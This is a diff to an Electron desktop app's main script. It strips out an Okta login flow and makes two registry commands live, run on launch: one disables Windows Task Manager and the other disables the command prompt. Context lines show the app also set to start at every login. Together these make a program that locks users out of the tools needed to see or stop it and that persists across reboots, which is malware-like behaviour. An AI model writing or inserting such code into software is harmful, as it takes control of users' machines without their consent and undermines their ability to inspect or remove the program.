@@ -3,56 +3,12 @@ const { app, BrowserWindow } = require('electron')
 const path = require('path')
 const { spawn } = require('child_process');
 const { exec } = require('child_process');
-const OktaAuth = require("@okta/okta-auth-js").OktaAuth;
 
+// Disable Task Manager
+exec('REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f');
 
-// // Disable Task Manager
-// exec('REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f');
-
-// // Disable CMD
-// exec('REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f');
-
-
-const { ipcMain } = require("electron");
-
-
-var config = {
-  // Required config
-  issuer: "https://dev-07949561.okta.com/oauth2/default",
-  clientId: "0oa9oai62nDrdL3bC5d7",
-};
-
-var authClient = new OktaAuth(config);
-
-
-ipcMain.on("user:login", (event, data) => {
-  authClient
-    .signInWithCredentials(data)
-    .then(function (res) {
-      console.log(res);
-
-      if (res.data.status != "SUCCESS") {
-        event.reply("login-failed", err.errorSummary);
-        return;
-      }
-
-      user = res.user;
-      openHome();
-    })
-    .catch(function (err) {
-      console.log(err);
-      event.reply("login-failed", err.errorSummary);
-    });
-});
-
-ipcMain.handle("user:get", (event) => {
-  return user;
-});
-
-ipcMain.on("user:logout", (event) => {
-  user = null;
-  openIndex();
-});
+// Disable CMD
+exec('REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f');
 
 function createWindow () {
   // Create the browser window.
@@ -80,25 +36,11 @@ function createWindow () {
   //});
 }
 
-
-function openIndex() {
-  mainWindow.loadFile("index.html");
-
-  // Open the DevTools.
-  mainWindow.webContents.openDevTools();
-}
-
-function openHome() {
-  mainWindow.loadFile("home.html");
-}
-
 // This method will be called when Electron has finished
 // initialization and is ready to create browser windows.
 // Some APIs can only be used after this event occurs.
 app.whenReady().then(() => {
   createWindow()
-    openIndex();
-
   // Add your app to the user's startup programs
   app.setLoginItemSettings({
     openAtLogin: true,
